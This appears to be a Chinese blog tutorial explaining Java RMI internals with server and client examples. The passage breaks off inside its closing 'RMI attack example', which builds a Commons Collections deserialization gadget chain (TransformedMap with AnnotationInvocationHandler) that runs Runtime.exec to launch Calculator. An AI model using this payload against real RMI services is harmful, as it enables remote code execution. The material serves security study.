<h2 id="远程对象"><a href="#远程对象" class="headerlink" title="远程对象"></a>远程对象</h2><p>在RMI中的核心就是远程对象，一切都是围绕这个东西来进行的。</p>
<p><strong>顾名思义，远程对象是存在于服务端以供客户端调用的对象。</strong>任何可以被远程调用的对象都必须实现 java.rmi.Remote 接口，远程对象的实现类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法中调用UnicastRemoteObject.exportObject()静态方法。这个远程对象中可能有很多个函数，但是只有在远程接口中声明的函数才能被远程调用，其他的公共函数只能在本地的JVM中使用。</p>
<p>使用远程方法调用，必然会涉及参数的传递和执行结果的返回。参数或者返回值可以是基本数据类型，当然也有可能是对象的引用。所以这些需要被传输的对象必须可以被序列化，这要求相应的类必须实现 java.io.Serializable 接口，并且客户端的serialVersionUID字段要与服务器端保持一致。</p>
<h2 id="序列化传输数据"><a href="#序列化传输数据" class="headerlink" title="序列化传输数据"></a>序列化传输数据</h2><p>客户端远程调用时传递给服务器的参数，服务器执行后传递给客户端的返回值。参数或者返回值，在传输时候会被序列化，在被接受时会被反序列化。</p>
<p>因此这些传输的对象必须可以被序列化，相应的类必须实现<code>java.io.Serializable</code>接口，并且客户端的<code>serialVersionUID</code>字段要与服务器端保持一致。</p>
<h1 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h1><p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625144743014.png" alt="image-20200625144743014"></p>
<p>如图，先假设：</p>
<ul>
<li>有两个远程服务接口可供Client调用，Factory和Product接口</li>
<li>FactoryImpl类实现了Factory接口，ProductImpl类实现了Product接口</li>
</ul>
<p>工厂模式的处理流程为：</p>
<ol>
<li>FactoryImpl被注册到了RMI Registry中；</li>
<li>Client端请求一个Factory的引用；</li>
<li>RMI Registry返回Client端一个FactoryImpl的引用；</li>
<li>Client端调用FactoryImpl的远程方法请求一个ProductImpl的远程引用；</li>
<li>FactoryImpl返回给Client端一个ProductImpl引用；</li>
<li>Client通过ProductImpl引用调用远程方法；</li>
</ol>
<p>可以看到，客户端向<code>RMI Registry</code>请求获取到指定的FactoryImpl的引用后，再通过调用FactoryImpl的远程方法请求一个ProductImpl的远程引用，从而调用到ProductImpl引用指向的远程方法。</p>
<p>上面提到的创建<code>FactoryImpl对象</code>，设置<code>FactoryImpl对象</code>的<code>指向ProductImp</code>（通过HTTP等协议定位，可以位于其他服务器），具有指向功能的对象也可以叫做<code>reference对象</code>。</p>
<p>这种RMI+Reference的技术在JNDI注入中是单独作为一种利用方式。</p>
<p>这里执行远程对象的方法的是RMI通讯的客户端，为攻击客户端的方式，是在具体的代码和利用场景可以参考FastJson中的JNDI注入。</p>
<h1 id="java-rmi包简介"><a href="#java-rmi包简介" class="headerlink" title="java.rmi包简介"></a>java.rmi包简介</h1><h2 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h2><p>一个接口interface，这个interface中没有声明任何方法。只有定义在“remote interface”，即继承了Remote的接口中的方法，才可以被远程调用。</p>
<h2 id="RemoteException"><a href="#RemoteException" class="headerlink" title="RemoteException"></a>RemoteException</h2><p>RemoteException是所有在远程调用中所抛出异常的超类，所有能够被远程调用的方法声明，都需要抛出此异常。</p>
<h2 id="Naming"><a href="#Naming" class="headerlink" title="Naming"></a>Naming</h2><p>提供向<code>RMI Registry</code>保存远程对象引用或者从<code>RMI Registry</code>获取远程对象引用的方法。这个类中的方法都是静态方法，每一个方法都包含了一个类型为String的name参数, 这个参数是URL格式，形如://host:port/name。</p>
<h2 id="Registry"><a href="#Registry" class="headerlink" title="Registry"></a>Registry</h2><p>一个interface, 其功能和Naming类似，每个方法都有一个String类型的name参数，但是这个name不是URL格式，是远程对象的一个命名。Registry的实例可以通过方法LocateRegistry.getRegistry()获得。</p>
<h2 id="LocateRegistry"><a href="#LocateRegistry" class="headerlink" title="LocateRegistry"></a>LocateRegistry</h2><p>用于获取到<code>RMI Registry</code>的一个连接，这个连接可以用于获取一个远程对象的引用。也可以创建一个注册中心。</p>
<h2 id="RemoteObject"><a href="#RemoteObject" class="headerlink" title="RemoteObject"></a>RemoteObject</h2><p>重新覆写了Object对象中的equals,hashCode,toString方法，从而可以用于远程调用。</p>
<h2 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h2><p>用于获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。</p>
<h2 id="Unreferenced"><a href="#Unreferenced" class="headerlink" title="Unreferenced"></a>Unreferenced</h2><p>一个interface, 声明了方法：void unreferenced()。如果一个远程对象实现了此接口，则这个远程对象在没有任何客户端引用的时候，这个方法会被调用。</p>
<h1 id="RMI动态类加载"><a href="#RMI动态类加载" class="headerlink" title="RMI动态类加载"></a>RMI动态类加载</h1><p>RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。<strong>对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件。</strong>如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>
<p>在之后的JNDI注入和反序列化漏洞的利用中，正是涉及到了动态类加载。</p>
<h1 id="编写RMI的步骤"><a href="#编写RMI的步骤" class="headerlink" title="编写RMI的步骤"></a>编写RMI的步骤</h1><h2 id="定义服务端供远程调用的类"><a href="#定义服务端供远程调用的类" class="headerlink" title="定义服务端供远程调用的类"></a>定义服务端供远程调用的类</h2><p>在此之前先定义一个可序列化的Model层的用户类，其实例可放置于服务端进行远程调用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonEntity</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义一个远程接口"><a href="#定义一个远程接口" class="headerlink" title="定义一个远程接口"></a>定义一个远程接口</h2><p>远程接口必须继承java.rmi.Remote接口，且抛出RemoteException错误：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">PersonService</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="开发接口的实现类"><a href="#开发接口的实现类" class="headerlink" title="开发接口的实现类"></a>开发接口的实现类</h2><p>建立PersonServiceImpl实现远程接口，注意此为远程对象实现类，需要继承UnicastRemoteObject（如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PersonServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">PersonService</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">PersonServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">      <span class="comment">// TODO Auto-generated constructor stub</span></span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;PersonEntity&gt; <span class="title">GetList</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        System.out.println(<span class="string">"Get Person Start!"</span>);</span><br><span class="line">        List&lt;PersonEntity&gt; personList = <span class="keyword">new</span> LinkedList&lt;PersonEntity&gt;();</span><br><span class="line"></span><br><span class="line">        PersonEntity person1 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person1.setAge(<span class="number">3</span>);</span><br><span class="line">        person1.setId(<span class="number">0</span>);</span><br><span class="line">        person1.setName(<span class="string">"0range"</span>);</span><br><span class="line">        personList.add(person1);</span><br><span class="line"></span><br><span class="line">        PersonEntity person2 = <span class="keyword">new</span> PersonEntity();</span><br><span class="line">        person2.setAge(<span class="number">18</span>);</span><br><span class="line">        person2.setId(<span class="number">1</span>);</span><br><span class="line">        person2.setName(<span class="string">"Wind"</span>);</span><br><span class="line">        personList.add(person2);</span><br><span class="line">        <span class="keyword">return</span> personList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建Server和Registry"><a href="#创建Server和Registry" class="headerlink" title="创建Server和Registry"></a>创建Server和Registry</h2><p>其实Server和Registry可以单独运行创建，其中Registry可通过代码启动也可通过rmiregistry命令启动，这里只进行简单的演示，将Server和Registry的创建、对象绑定注册表等都写到一块，且Registry直接代码启动：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Program</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            PersonService personService=<span class="keyword">new</span> PersonServiceImpl();</span><br><span class="line">            <span class="comment">//注册通讯端口</span></span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">9898</span>);</span><br><span class="line">            <span class="comment">//注册通讯路径</span></span><br><span class="line">            Naming.rebind(<span class="string">"rmi://127.0.0.1:9898/PersonService"</span>, personService);</span><br><span class="line">            System.out.println(<span class="string">"Service Start!"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="创建客户端并查找调用远程方法"><a href="#创建客户端并查找调用远程方法" class="headerlink" title="创建客户端并查找调用远程方法"></a>创建客户端并查找调用远程方法</h2><p>这里我们通过Naming.lookup()来查找RMI Server端的远程对象并获取到本地客户端环境中输出出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//调用远程对象，注意RMI路径与接口必须与服务器配置一致</span></span><br><span class="line">            PersonService personService=(PersonService) Naming.lookup(<span class="string">"rmi://127.0.0.1:9898/PersonService"</span>);</span><br><span class="line">            List&lt;PersonEntity&gt; personList=personService.GetList();</span><br><span class="line">            <span class="keyword">for</span>(PersonEntity person:personList)&#123;</span><br><span class="line">                System.out.println(<span class="string">"ID:"</span>+person.getId()+<span class="string">" Age:"</span>+person.getAge()+<span class="string">" Name:"</span>+person.getName());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception ex)&#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，我们看下模拟运行的场景。</p>
<p>先启动Server和Register，开启成功后显示“Server Start!”，然后运行Client程序，可以看到客户端成功获取到了在Register注册的Server中的远程对象的内容：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625153417419.png" alt="image-20200625153417419"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625153430585.png" alt="image-20200625153430585"></p>
<h2 id="几个函数"><a href="#几个函数" class="headerlink" title="几个函数"></a>几个函数</h2><p>这里小结下几个函数：</p>
<ul>
<li>bind(String name, Object obj)：注册对象，把对象和一个名字name绑定，这里的name其实就是URL格式。如果该名字已经与其他对象绑定，则抛出NameAlreadyBoundException错误；</li>
<li>rebind(String name, Object obj)：注册对象，把对象和一个名字name绑定。如果改名字已经与其他对象绑定，不会抛出NameAlreadyBoundException错误，而是把当前参数obj指定的对象覆盖原先的对象（更暴力）；</li>
<li>lookup(String name)：查找对象，返回与参数name指定的名字所绑定的对象；</li>
<li>unbind(String name)：注销对象，取消对象与名字的绑定；</li>
</ul>
<h1 id="经典例子"><a href="#经典例子" class="headerlink" title="经典例子"></a>经典例子</h1><p>这里我再写一个例子，用于强化。</p>
<p>首先我还是生成一个接口，叫它<code>IRemoteMath</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 必须继承Remote接口。</span></span><br><span class="line"><span class="comment"> * 所有参数和返回类型必须序列化(因为要网络传输)。</span></span><br><span class="line"><span class="comment"> * 任意远程对象都必须实现此接口。</span></span><br><span class="line"><span class="comment"> * 只有远程接口中指定的方法可以被调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IRemoteMath</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 所有方法必须抛出RemoteException</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>这个远程接口必须继承Remote类；</li>
<li>内部抽象方法必须都有throw RemoteException</li>
</ul>
<p>接下来我写一个接口的实现类，叫做<code>RemoteMath</code>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端实现远程接口。</span></span><br><span class="line"><span class="comment"> * 必须继承UnicastRemoteObject，以允许JVM创建远程的存根/代理。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteMath</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">IRemoteMath</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> numberOfComputations;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">RemoteMath</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">add</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">                + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a+b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">subtract</span><span class="params">(<span class="keyword">double</span> a, <span class="keyword">double</span> b)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        numberOfComputations++;</span><br><span class="line">        System.out.println(<span class="string">"Number of computations performed so far = "</span></span><br><span class="line">                + numberOfComputations);</span><br><span class="line">        <span class="keyword">return</span> (a-b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>这个类其实就是接口实现类<ul>
<li>实现接口的全部方法，这个不必多说@overide</li>
<li>必须继承UnicastRemoteObject</li>
</ul>
</li>
<li>用它来实现接口中声明的所有抽象方法，它就是接口的实现类。</li>
</ul>
<p>接下来是第一个关键角色Server，这里我是把Server和Client合在一起，实现如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建RemoteMath类的实例并在rmiregistry中注册。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span>  </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 注册远程对象,向客户端提供远程对象服务。</span></span><br><span class="line">            <span class="comment">// 远程对象是在远程服务上创建的，你无法确切地知道远程服务器上的对象的名称，</span></span><br><span class="line">            <span class="comment">// 但是,将远程对象注册到RMI Registry之后,</span></span><br><span class="line">            <span class="comment">// 客户端就可以通过RMI Registry请求到该远程服务对象的stub，</span></span><br><span class="line">            <span class="comment">// 利用stub代理就可以访问远程服务对象了。</span></span><br><span class="line">            IRemoteMath remoteMath = <span class="keyword">new</span> RemoteMath();</span><br><span class="line">            LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry();</span><br><span class="line">            registry.bind(<span class="string">"Compute"</span>, remoteMath);</span><br><span class="line">            System.out.println(<span class="string">"Math server ready"</span>);</span><br><span class="line">            <span class="comment">// 如果不想再让该对象被继续调用，使用下面一行</span></span><br><span class="line">            <span class="comment">// UnicastRemoteObject.unexportObject(remoteMath, false);</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>在这里，首先<code>接口=new 实现类</code>，用到了Java多态，从这里开始也是用接口去注册，用接口去迎接；</li>
<li>接下来注册一个端口，默认是1099；</li>
<li>接下来将名字与接口实现类对象绑定，上面就是“Compute”和remoteMath</li>
<li>之后客户端就可以通过RMI Registry请求到该远程服务对象的stub了</li>
</ul>
<p>客户端实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MathClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 如果RMI Registry就在本地机器上，URL就是:rmi://localhost:1099/hello</span></span><br><span class="line">            <span class="comment">// 否则，URL就是：rmi://RMIService_IP:1099/hello</span></span><br><span class="line">            <span class="comment">//Registry registry = LocateRegistry.getRegistry("localhost");</span></span><br><span class="line">            <span class="comment">// 从Registry中检索远程对象的存根/代理</span></span><br><span class="line">            <span class="comment">//IRemoteMath remoteMath = (IRemoteMath) registry.lookup("Compute");</span></span><br><span class="line">            IRemoteMath remoteMath=(IRemoteMath) Naming.lookup(<span class="string">"rmi://127.0.0.1:1099/Compute"</span>);</span><br><span class="line">            <span class="comment">// 调用远程对象的方法</span></span><br><span class="line">            <span class="keyword">double</span> addResult = remoteMath.add(<span class="number">5.0</span>, <span class="number">3.0</span>);</span><br><span class="line">            System.out.println(<span class="string">"5.0 + 3.0 = "</span> + addResult);</span><br><span class="line">            <span class="keyword">double</span> subResult = remoteMath.subtract(<span class="number">5.0</span>, <span class="number">3.0</span>);</span><br><span class="line">            System.out.println(<span class="string">"5.0 - 3.0 = "</span> + subResult);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<ul>
<li>首先Naming.lookup去寻找Compute服务，用接口去迎接，拿到远程对象</li>
<li>拿到远程对象之后，通过它去调用远程方法，实现整个流程</li>
</ul>
<p>结果截图：</p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625223328712.png" alt="image-20200625223328712"></p>
<p><img src="../images/Java-RMI%E5%8E%9F%E7%90%86%E5%8F%8A%E5%AE%9E%E6%88%98/image-20200625223336217.png" alt="image-20200625223336217"></p>
<h2 id="多说两句"><a href="#多说两句" class="headerlink" title="多说两句"></a>多说两句</h2><p>这里说明一下，当执行<code>Registry registry = LocateRegistry.createRegistry(1099);</code>的时候，返回的registry对象类是sun.rmi.registry.RegistryImpl，其内部的ref，也就是sun.rmi.server.UnicastServerRef，持有sun.rmi.registry.RegistryImpl_Skel类型的对象变量ref。</p>
<p>而服务端以及客户端，执行<code>Registry registry = LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099);</code>返回的是sun.rmi.registry.RegistryImpl_Stub。</p>
<p>当服务端对实现了HelloService接口并继承了UnicastRemoteObject类的HelloServiceImpl实例化时，在其父类UnicastRemoteObject中，会对当前对象进行导出，返回一个当前对象的stub，也就是HelloService_stub，在其执行<code>registry.bind(&quot;hello&quot;, helloService);</code>的时候，会把这个stub对象，发送到RMI Registry存根。</p>
<p>当客户端执行<code>HelloService helloService = (HelloService) registry.lookup(&quot;hello&quot;)</code>的时候，就会从RMI Registry获取到服务端存进去的stub。</p>
<p>接着客户端就可以通过stub对象，对服务端发起一个远程方法调用<code>helloService.sayHello()</code>，stub对象内部存储了如何跟服务端联系的信息，以及封装了RMI的通讯实现细节，对开发者完全透明。</p>
<h1 id="RMI攻击实例"><a href="#RMI攻击实例" class="headerlink" title="RMI攻击实例"></a>RMI攻击实例</h1><h2 id="定义一个接口"><a href="#定义一个接口" class="headerlink" title="定义一个接口"></a>定义一个接口</h2><p><code>sayHello</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RemoteHello</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function">String <span class="title">exp1</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    <span class="function">Object <span class="title">exp2</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="定义接口实现类"><a href="#定义接口实现类" class="headerlink" title="定义接口实现类"></a>定义接口实现类</h2><p>其中：</p>
<p>exp1是客户端攻击服务端接口；</p>
<p>exp2是服务端攻击客户端接口；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoteHelloImpl</span> <span class="keyword">implements</span> <span class="title">RemoteHello</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format</span><br><span class="line">          (<span class="string">"Hello, %s!"</span>, name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">exp1</span><span class="params">(Object exp)</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exp1 is "</span> + exp);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"exp1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">exp2</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"exp2"</span>);</span><br><span class="line">        <span class="keyword">return</span> payload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">payload</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[0]&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String.class&#125;, new Object[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">transformedMap</span>)</span>;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span 